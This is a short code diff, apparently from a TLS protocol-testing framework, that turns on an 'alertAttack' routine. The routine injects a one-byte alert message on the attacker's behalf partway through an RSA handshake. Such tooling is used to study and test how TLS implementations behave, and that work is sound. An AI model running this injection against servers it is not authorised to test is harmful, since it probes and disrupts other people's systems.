@@ -25,14 +25,14 @@ let httpRequest host =
 
 let alertAttack peer =
     // Connect to the server
-    let st,cfg = FlexConnection.clientOpenTcpConnection(peer,peer) in
+    let st,_ = FlexConnection.clientOpenTcpConnection(peer,peer) in
 
     // Start a typical RSA handshake with the server
     let st,nsc,ch = FlexClientHello.send(st) in
     let st,nsc,sh = FlexServerHello.receive(st,nsc) in
 
     // *** Inject a one byte alert on behalf of the attacker ***
-    //let st = FlexAlert.send(st,Bytes.abytes [|1uy|]) in
+    let st = FlexAlert.send(st,Bytes.abytes [|1uy|]) in
 
     // Continue the typical RSA handshake
     let st,nsc,cert = FlexCertificate.receive(st,Client,nsc) in
